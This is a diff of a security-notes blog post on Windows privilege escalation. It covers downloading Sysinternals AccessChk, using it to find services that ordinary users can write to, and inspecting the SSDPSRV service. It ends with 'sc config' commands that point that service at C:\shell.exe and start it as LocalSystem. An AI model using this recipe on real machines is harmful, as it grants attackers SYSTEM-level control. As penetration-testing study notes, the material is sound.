@@ -6,19 +6,19 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="Download AccessCheck
-12345678910(( STAGE++ )); echo -e &amp;quot;\n\n $&amp;#123;GREEN&amp;#125;[+]$&amp;#123;RESET&amp;#125; ($&amp;#123;STAGE&amp;#125;/$&amp;#123;TOTAL&amp;#125;) Downloading $&amp;#123;GREEN&amp;#125;AccessChk.exe$&amp;#123;RESE">
+    <meta name="description" content="AccessCheckDownload AccessCheck12345678910(( STAGE++ )); echo -e &amp;quot;\n\n $&amp;#123;GREEN&amp;#125;[+]$&amp;#123;RESET&amp;#125; ($&amp;#123;STAGE&amp;#125;/$&amp;#123;TOTAL&amp;#125;) Downloading $&amp;#123;GREEN&amp;#125;AccessChk.exe$">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Windows Privilege Escalation">
 <meta property="og:url" content="http://ostrokonskiy.tk/2017/01/23/windows-privilege-escalation/index.html">
 <meta property="og:site_name" content="Security Notes">
-<meta property="og:description" content="Download AccessCheck
-12345678910(( STAGE++ )); echo -e &amp;quot;\n\n $&amp;#123;GREEN&amp;#125;[+]$&amp;#123;RESET&amp;#125; ($&amp;#123;STAGE&amp;#125;/$&amp;#123;TOTAL&amp;#125;) Downloading $&amp;#123;GREEN&amp;#125;AccessChk.exe$&amp;#123;RESE">
-<meta property="og:updated_time" content="2017-01-23T12:03:38.215Z">
+<meta property="og:description" content="AccessCheckDownload AccessCheck12345678910(( STAGE++ )); echo -e &amp;quot;\n\n $&amp;#123;GREEN&amp;#125;[+]$&amp;#123;RESET&amp;#125; ($&amp;#123;STAGE&amp;#125;/$&amp;#123;TOTAL&amp;#125;) Downloading $&amp;#123;GREEN&amp;#125;AccessChk.exe$">
+<meta property="og:image" content="http://i.imgur.com/73YfzoO.png">
+<meta property="og:image" content="http://i.imgur.com/76ssTNl.png">
+<meta property="og:updated_time" content="2017-01-23T12:57:51.400Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows Privilege Escalation">
-<meta name="twitter:description" content="Download AccessCheck
-12345678910(( STAGE++ )); echo -e &amp;quot;\n\n $&amp;#123;GREEN&amp;#125;[+]$&amp;#123;RESET&amp;#125; ($&amp;#123;STAGE&amp;#125;/$&amp;#123;TOTAL&amp;#125;) Downloading $&amp;#123;GREEN&amp;#125;AccessChk.exe$&amp;#123;RESE">
+<meta name="twitter:description" content="AccessCheckDownload AccessCheck12345678910(( STAGE++ )); echo -e &amp;quot;\n\n $&amp;#123;GREEN&amp;#125;[+]$&amp;#123;RESET&amp;#125; ($&amp;#123;STAGE&amp;#125;/$&amp;#123;TOTAL&amp;#125;) Downloading $&amp;#123;GREEN&amp;#125;AccessChk.exe$">
+<meta name="twitter:image" content="http://i.imgur.com/73YfzoO.png">
     
     
         
@@ -99,7 +99,7 @@
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AccessCheck"><span class="toc-number">1.</span> <span class="toc-text">AccessCheck</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Download-AccessCheck"><span class="toc-number">1.1.</span> <span class="toc-text">Download AccessCheck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AccessCheck-usage-examples"><span class="toc-number">1.2.</span> <span class="toc-text">AccessCheck usage examples</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-output"><span class="toc-number">1.2.1.</span> <span class="toc-text">Example output:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Service-controller"><span class="toc-number">2.</span> <span class="toc-text">Service controller</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-output-1"><span class="toc-number">2.1.</span> <span class="toc-text">Example output</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -133,9 +133,18 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>Download AccessCheck</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(( STAGE++ )); echo -e &quot;\n\n $&#123;GREEN&#125;[+]$&#123;RESET&#125; ($&#123;STAGE&#125;/$&#123;TOTAL&#125;) Downloading $&#123;GREEN&#125;AccessChk.exe$&#123;RESET&#125; ~ Windows environment tester&quot;</div><div class="line">apt -y -qq install curl windows-binaries unzip \</div><div class="line">  || echo -e &apos; &apos;$&#123;RED&#125;&apos;[!] Issue with apt install&apos;$&#123;RESET&#125; 1&gt;&amp;2</div><div class="line">echo -n &apos;[1/2]&apos;; timeout 300 curl --progress -k -L -f &quot;https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe&quot; &gt; /usr/share/windows-binaries/accesschk_v5.02.exe \</div><div class="line">  || echo -e &apos; &apos;$&#123;RED&#125;&apos;[!]&apos;$&#123;RESET&#125;&quot; Issue downloading accesschk_v5.02.exe&quot; 1&gt;&amp;2   #***!!! hardcoded path!</div><div class="line">echo -n &apos;[2/2]&apos;; timeout 300 curl --progress -k -L -f &quot;https://download.sysinternals.com/files/AccessChk.zip&quot; &gt; /usr/share/windows-binaries/AccessChk.zip \</div><div class="line">  || echo -e &apos; &apos;$&#123;RED&#125;&apos;[!]&apos;$&#123;RESET&#125;&quot; Issue downloading AccessChk.zip&quot; 1&gt;&amp;2</div><div class="line">unzip -q -o -d /usr/share/windows-binaries/ /usr/share/windows-binaries/AccessChk.zip</div><div class="line">rm -f /usr/share/windows-binaries/&#123;AccessChk.zip,Eula.txt&#125;</div><div class="line"></div></pre></td></tr></table></figure>
+    <h2 id="AccessCheck"><a href="#AccessCheck" class="headerlink" title="AccessCheck"></a>AccessCheck</h2><h3 id="Download-AccessCheck"><a href="#Download-AccessCheck" class="headerlink" title="Download AccessCheck"></a>Download AccessCheck</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(( STAGE++ )); echo -e &quot;\n\n $&#123;GREEN&#125;[+]$&#123;RESET&#125; ($&#123;STAGE&#125;/$&#123;TOTAL&#125;) Downloading $&#123;GREEN&#125;AccessChk.exe$&#123;RESET&#125; ~ Windows environment tester&quot;</div><div class="line">apt -y -qq install curl windows-binaries unzip \</div><div class="line">  || echo -e &apos; &apos;$&#123;RED&#125;&apos;[!] Issue with apt install&apos;$&#123;RESET&#125; 1&gt;&amp;2</div><div class="line">echo -n &apos;[1/2]&apos;; timeout 300 curl --progress -k -L -f &quot;https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe&quot; &gt; /usr/share/windows-binaries/accesschk_v5.02.exe \</div><div class="line">  || echo -e &apos; &apos;$&#123;RED&#125;&apos;[!]&apos;$&#123;RESET&#125;&quot; Issue downloading accesschk_v5.02.exe&quot; 1&gt;&amp;2   #***!!! hardcoded path!</div><div class="line">echo -n &apos;[2/2]&apos;; timeout 300 curl --progress -k -L -f &quot;https://download.sysinternals.com/files/AccessChk.zip&quot; &gt; /usr/share/windows-binaries/AccessChk.zip \</div><div class="line">  || echo -e &apos; &apos;$&#123;RED&#125;&apos;[!]&apos;$&#123;RESET&#125;&quot; Issue downloading AccessChk.zip&quot; 1&gt;&amp;2</div><div class="line">unzip -q -o -d /usr/share/windows-binaries/ /usr/share/windows-binaries/AccessChk.zip</div><div class="line">rm -f /usr/share/windows-binaries/&#123;AccessChk.zip,Eula.txt&#125;</div><div class="line"></div></pre></td></tr></table></figure>
 <p><a href="https://github.com/g0tmi1k/os-scripts/blob/master/kali-rolling.sh" target="_blank" rel="external">source</a></p>
+<p>On Windows XP you should use AccessCheck 5.2 version.</p>
+<p>When uploading AccessCheck on FTP server it is very important to use binary mode by simply typing <code>binary</code> right after connection.</p>
+<h3 id="AccessCheck-usage-examples"><a href="#AccessCheck-usage-examples" class="headerlink" title="AccessCheck usage examples"></a>AccessCheck usage examples</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">accesschk_v5.02.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</div></pre></td></tr></table></figure>
+<p><code>-u</code> - suppress errors<br><code>-w</code> - show only objects that have write access<br><code>-c</code> - same is a Windows Service, e.g. ssdpsrv. Specify “*” as the name to show all services and “scmanager” to check the security of the Service Control Manager.<br><code>-q</code> - omit banner<br><code>-v</code> - verbose</p>
+<h4 id="Example-output"><a href="#Example-output" class="headerlink" title="Example output:"></a>Example output:</h4><p><img src="http://i.imgur.com/73YfzoO.png" alt="accesscheckoutput"></p>
+<p><a href="https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx" target="_blank" rel="external">source</a></p>
+<h2 id="Service-controller"><a href="#Service-controller" class="headerlink" title="Service controller"></a>Service controller</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc qc SSDPSRV</div></pre></td></tr></table></figure>
+<h3 id="Example-output-1"><a href="#Example-output-1" class="headerlink" title="Example output"></a>Example output</h3><p><img src="http://i.imgur.com/76ssTNl.png" alt="scqc"></p>
+<p>To escalate privileges we can change binary path name, user and then start this server with system privileges:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sc config SSDPSRV binpath= &quot;C:\shell.exe&quot;</div><div class="line">sc config SSDPSRV obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</div><div class="line">sc config SSDPSRV start= demand</div><div class="line">net start SSDPSRV</div></pre></td></tr></table></figure>
 
   </div>
 </article>
@@ -164,7 +173,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AccessCheck"><span class="toc-number">1.</span> <span class="toc-text">AccessCheck</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Download-AccessCheck"><span class="toc-number">1.1.</span> <span class="toc-text">Download AccessCheck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AccessCheck-usage-examples"><span class="toc-number">1.2.</span> <span class="toc-text">AccessCheck usage examples</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Example-output"><span class="toc-number">1.2.1.</span> <span class="toc-text">Example output:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Service-controller"><span class="toc-number">2.</span> <span class="toc-text">Service controller</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-output-1"><span class="toc-number">2.1.</span> <span class="toc-text">Example output</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
